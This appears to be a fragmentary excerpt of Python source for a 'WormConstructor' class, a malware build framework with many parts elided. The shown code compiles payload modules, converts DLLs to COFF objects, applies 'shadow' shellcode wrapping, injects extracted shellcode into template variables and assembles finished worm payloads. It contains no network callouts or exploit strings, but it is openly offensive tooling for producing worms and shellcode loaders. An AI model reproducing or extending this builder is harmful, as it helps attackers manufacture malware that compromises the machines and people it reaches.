...
class WormConstructor:
    ...
    def saveFileBin(self, fpath: str, data: bytes) -> bool:
        try:
            with open(fpath, "wb") as file:
                file.write(data)
            return True
        except Exception as e:
            self.msg("error", f"[!!] ERROR Save bin file: {fpath}. {e} [!!]", sender=self.name)
            return False
    ...
    def loadCodeBin(self, fpath: str) -> Union[bytes, None]:
        try:
            with open(fpath, "rb") as file:
                data = file.read()
            return data
        except Exception as e:
            self.msg("error", f"[!!] ERROR Load binary code: {fpath}. {e} [!!]", sender=self.name)
            return None
    ...
    def buildWorm(self, module_list: list = None, options: dict = {}) -> None:
        ...
        ### new 
        if not master.FLAG_NO_COMPILE:
            self.msg("msg", "Start Compiler....", sender=self.name)
            self.masterCompiler.compilerCore.compiler.start()
        else:
            self.msg("msg", "NO_COMPILE FLAG.", sender=self.name)
        ...
        if not master.FLAG_NO_COMPILE:
            ...
            self.masterCompiler.compilerCore.compiler.stop()
    ...
    def addProcessStep(self, process_name: str) -> Callable:
        match process_name.lower():
            ...
            case "build_worm":
                return self.process_BuildWorm
            case "build_coff":
                return self.process_BuildCoff
            case _:
    ...
    def process_BuildCode(self, raw_object: RawExe) -> RawExe:
        ...
        if raw_object.hiveType == "payload":
            if not raw_object.master_module.payloadCodeWrite:
                self.process_BuildPayloadCode(raw_object)
                return raw_object
    ...
    def process_BuildCoff(self, raw_exe: RawExe) -> RawExe:
        raw_exe.last_process_name = "Process Build BIN"
        self.msg("msg", "Building BIN file...", sender=self.name)
        if len(raw_exe.getChildMods) == 0:
            self.msg("msg", "No modules to build BIN file.", sender=self.name)
            return raw_exe
        # check DLL to BIN
        bdll = []
        for var_name, mod_type in raw_exe.master_module.modCOFF.items():
            if mod_type.lower() == "dll":
                bdll.append(var_name)
        raw_exe = self._buildCOFF_DLL(raw_exe, bdll)


        return raw_exe

    def _buildCOFF_DLL(self, raw_exe: RawExe, var_name: list = []) -> RawExe:
        index = 0
        for mdll in raw_exe.master_raw.worm_list_DLL:
            if not mdll.raw_compiler:
                continue
            if index >= len(var_name):
                return raw_exe
            else:
                var = var_name[index]
            raw_exe.VAR[var] = mdll.raw_compiler.buildCoffName(var)
            update = {"__BUILD_COFF_FLAG" : True}
            mdll.raw_compiler.updateConfig(update)
            if not self._buildCOFF_render(raw_exe, mdll.raw_compiler):
                self.msg("error", "Skip BIN file.", sender=self.name)
                index += 1
                continue
            # change module to COFF
            mdll.master_module.fileType = "coff"
            # COFF is not readyAPP
            mdll.master_module.readyApp = False
            if raw_exe.master_raw.FLAG_NO_COMPILE:
                self.msg("msg", "NO COMPILE Flag. Skip Step.", sender=self.name)
                index += 1
            else:
                self.masterCompiler.startCompile(mdll, mdll.raw_compiler)
        return raw_exe
    
    def _buildCOFF_render(self, raw_exe: RawExe, raw_comp: RawCompiler) -> bool:
        # dual-base rendering
        cvar = ChainMap(raw_exe.VAR, raw_comp.conf)
        code = self.renderSingleTemplate(raw_comp.raw_code, cvar)
        check = raw_comp.updateConfig(code)
        if not check:
            self.msg("error", raw_exe.last_process_error, sender=self.name)
            return False
        return True
    ...
    def process_Compile(self, raw_object: RawExe) -> RawExe:
        ...
        # Additional steps for PAYLOAD
        if raw_object.master_module.itemType == "payload":
            self._setupExePayload(raw_object)
        return raw_object
    ...
    def _setupExePayload(self, raw_exe: RawExe) -> RawExe:
        # Update Variables
        # Adding binary code to variables
        bin_code = self.loadCodeBin(raw_exe.final_output_fpath)
        if not bin_code:
            bin_code = b""
        raw_exe.updateProcessCode(bin_code)
        self.msg("dev", "Update variables.", sender=self.name)
        return raw_exe
    ...
    def _shadow_code(self, raw_exe: RawExe, shadow_mod: object) -> RawExe:
        self.msg("msg", f"Process Shadow: {shadow_mod.name}....", sender=self.name)
        sh_mod = self.SpecialModules.getModule("shadow", shadow_mod.name)
        if not sh_mod:
            return raw_exe
        if sh_mod.SHADOW_TYPE == "shellcode":
            return self._shadow_shellcode(raw_exe, shadow_mod, sh_mod)
        code = self.loadCode(raw_exe.fpath_src_file)
    ...
    def _shadow_shellcode(self, raw_exe: RawExe, shadow_lib_mod: object, sh_mod: object) -> RawExe:
        self.msg("msg", "Shadow Shellcode.....", sender=self.name)
        ## Process shadow
        raw_exe.updateProcessCode(sh_mod.PROCESS(shadow_lib_mod.raw_code, raw_exe.VAR))
        self.saveFile(raw_exe.fpath_src_file, raw_exe.processCode)
        ## extra Process Step
        if len(sh_mod.EXTRA_PROCESS_STEP) > 0:
            self.msg("msg", "Preapre extra process step for shadow....", sender=self.name)
            extra = self.prepareProcess(sh_mod.EXTRA_PROCESS_STEP)
            self.executeProcessList(raw_exe, extra)
            self.msg("msg", "Shadow complete.", sender=self.name)
        return raw_exe
...
#####################################################################################
    ...
    def process_ExtractShellcode(self, raw_exe: RawExe) -> RawExe:
        ...
        # Put shellcode to variables
        raw_exe.VAR["_SHELLCODE"] = data
        raw_exe.VAR["_SHELLCODE_LENGTH"] = len(shell_byte)
    ...
    def process_BuildWorm(self, raw_exe: RawExe) -> RawExe:
        raw_exe.last_process_name = "Process Build Worm"

        # Move the finished PAYLOADs to the "ReadyApp" directory
        for payload in raw_exe.master_raw.worm_list_PAYLOAD:
            if payload.master_module.owner == raw_exe.master_raw.worm_master:
                self.msg("msg", f"Copying ready Payload: {raw_exe.NAME} .", sender=self.name)
                try:
                    shutil.copy2(payload.final_output_fpath, raw_exe.final_output_fpath)
                except Exception as e:
                    self.msg("error", f"[!!] ERROR: Copying ready Payload: {e} [!!]", sender=self.name)

        # ## Saving the code file as final.
        # final_data = self.loadCodeBin(raw_exe.fpath_src_file)
        # # final_data = final_data.lstrip()
        
        # self.saveFileBin(raw_exe.final_output_fpath, final_data)
        return raw_exe
